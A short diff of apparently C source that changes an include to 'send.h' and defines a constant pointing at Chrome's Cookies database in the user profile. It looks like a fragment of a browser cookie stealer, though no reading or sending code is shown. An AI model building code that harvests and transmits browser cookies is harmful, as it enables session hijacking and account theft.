@@ -1,4 +1,4 @@
-#include "type.h"
+#include "send.h"
 
 #ifndef CH_PATH
  #define CH_PATH "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
